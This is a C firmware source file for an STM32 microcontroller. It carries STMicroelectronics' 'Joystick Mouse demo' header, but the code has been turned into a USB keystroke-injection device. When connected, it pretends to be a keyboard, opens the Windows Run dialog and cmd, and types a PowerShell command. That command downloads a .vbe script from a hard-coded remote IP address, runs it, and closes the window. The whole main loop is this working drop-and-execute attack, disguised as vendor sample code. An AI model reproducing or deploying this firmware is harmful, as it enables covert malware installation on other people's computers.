/******************** (C) COPYRIGHT 2007 STMicroelectronics ********************
* File Name          : main.c
* Author             : MCD Application Team
* Version            : V1.0
* Date               : 10/08/2007
* Description        : Joystick Mouse demo main file
********************************************************************************
* THE PRESENT SOFTWARE WHICH IS FOR GUIDANCE ONLY AIMS AT PROVIDING CUSTOMERS
* WITH CODING INFORMATION REGARDING THEIR PRODUCTS IN ORDER FOR THEM TO SAVE TIME.
* AS A RESULT, STMICROELECTRONICS SHALL NOT BE HELD LIABLE FOR ANY DIRECT,
* INDIRECT OR CONSEQUENTIAL DAMAGES WITH RESPECT TO ANY CLAIMS ARISING FROM THE
* CONTENT OF SUCH SOFTWARE AND/OR THE USE MADE BY CUSTOMERS OF THE CODING
* INFORMATION CONTAINED HEREIN IN CONNECTION WITH THEIR PRODUCTS.
*******************************************************************************/

/* Includes ------------------------------------------------------------------*/
#include "stm32f10x_lib.h"
#include "usb_lib.h"
#include "hw_config.h"

/* Private typedef -----------------------------------------------------------*/
/* Private define ------------------------------------------------------------*/
/* Private macro -------------------------------------------------------------*/
/* Private variables ---------------------------------------------------------*/
/* Extern variables ----------------------------------------------------------*/
/* Private function prototypes -----------------------------------------------*/
void Delay(vu32 nCount);

/* Private functions ---------------------------------------------------------*/

/*******************************************************************************
* Function Name  : main.
* Description    : main routine.
* Input          : None.
* Output         : None.
* Return         : None.
*******************************************************************************/
void __keyboard_send(u8 *Buffer)
{

		/*copy mouse position info in ENDP1 Tx Packet Memory Area*/
		UserToPMABufferCopy(Buffer, GetEPTxAddr(ENDP1), 8);
		/* enable endpoint for transmission */
		SetEPTxValid(ENDP1);
		Delay(1000000);
}

u8 Buffer_Shift[8]   = {0x2, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Shift
u8 Buffer_Win[8]     = {0x8, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Win
u8 Buffer_Win_R[8]   = {0x8, 0, 0x15, 0, 0, 0, 0, 0}; //Keyboard R
u8 buffer_release[8] = {0, 0, 0, 0, 0, 0, 0, 0};

#if 0
u8 buffer_c[8] = {0, 0, 0x06, 0, 0, 0, 0, 0}; //Keyboard c
u8 buffer_m[8] = {0, 0, 0x10, 0, 0, 0, 0, 0}; //Keyboard m
u8 buffer_d[8] = {0, 0, 0x07, 0, 0, 0, 0, 0}; //Keyboard d

u8 buffer_enter[8] = {0, 0, 0x28, 0, 0, 0, 0, 0}; //Keyboard d
#endif

int keyboard_send_ascii(u8 c)
{
	u8 capital = 0;
	u8 hid_code;
	u8 buffer[8] = {0, 0, 0, 0, 0, 0, 0, 0};
	
	if (c >= 'a' && c <= 'z') {
		hid_code = 0x04 + (c - 'a');
	} else if (c >= 'A' && c <= 'Z') {
		hid_code = 0x04 + (c - 'A');
		capital = 1;
	} else if (c >= '0' && c <= '9') {
		if (c == '0') {
			hid_code = 0x27;
		} else {
			hid_code = 0x1E + (c - '1');
		}	
	} else {
			
		switch (c) {
			case (':'): /* ':' = capital(';') */
				hid_code = 0x33;
				capital = 1;
				break;		
			case ('\"'): /* '\"' = capital(''') */
				hid_code = 0x34;
				capital = 1;
				break;		
			case ('('): /* '(' = capital('9') */
				hid_code = 0x26;
				capital = 1;
				break;		
			case (')'): /* '(' = capital('0') */
				hid_code = 0x27;
				capital = 1;
				break;					
			case (' '):
				hid_code = 0x2C;
				break;
			case ('-'):
				hid_code = 0x2d;
				break;
			case ('='):
				hid_code = 0x2E;
				break;
			case ('\\'):
				hid_code = 0x31;
				break;
			case ('\''):
				hid_code = 0x34;
				break;
			case (','):
				hid_code = 0x36;
				break;
			case ('.'):
				hid_code = 0x37;
				break;
			case ('/'):
				hid_code = 0x38;
				break;			
			case ('\n'):
				hid_code = 0x28;
				break;
			default:
				return -1;
		}
	}
	buffer[2] = hid_code;
	
	if (capital) {
		buffer[0] = 0x2;
		__keyboard_send(Buffer_Shift);
	}

	__keyboard_send(buffer);
	
	if (capital) {
		__keyboard_send(Buffer_Shift);
	}
	
	__keyboard_send(buffer_release);
	return 0;
}


int keyboard_send_string(char *s)
{
	int i;
	
	for(i = 0; s[i] != '\0'; i++) {
			keyboard_send_ascii(s[i]);
	}
	
	return 0;
}
int main(void)
{
#ifdef DEBUG
  debug();
#endif

  Set_System();

  USB_Interrupts_Config();

  Set_USBClock();

  USB_Init();
	
  Delay(10000000);
	
  while (1)
  {
    Delay(10000);
		__keyboard_send(Buffer_Win);

		__keyboard_send(Buffer_Win_R);

		__keyboard_send(Buffer_Win);

		__keyboard_send(buffer_release);	
		
		//keyboard_send_string("CMD\n\n");
		//keyboard_send_string("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");
		keyboard_send_string("cmd\n\n");
		
		/*******switch the input method to english **********/
		__keyboard_send(Buffer_Shift);
		__keyboard_send(buffer_release);
		/****************************************************/
		
		keyboard_send_string("powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n");
		keyboard_send_string("D:\\test.vbe\n");
		keyboard_send_string("exit\n");
		
		break;
  }
}

/*******************************************************************************
* Function Name  : Delay
* Description    : Inserts a delay time.
* Input          : nCount: specifies the delay time length.
* Output         : None
* Return         : None
*******************************************************************************/
void Delay(vu32 nCount)
{
  for(; nCount!= 0;nCount--);
}

#ifdef  DEBUG
/*******************************************************************************
* Function Name  : assert_failed
* Description    : Reports the name of the source file and the source line number
*                  where the assert_param error has occurred.
* Input          : - file: pointer to the source file name
*                  - line: assert_param error line source number
* Output         : None
* Return         : None
*******************************************************************************/
void assert_failed(u8* file, u32 line)
{ 
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */

  /* Infinite loop */
  while(1)
  {
  }
}
#endif

/******************* (C) COPYRIGHT 2007 STMicroelectronics *****END OF FILE****/
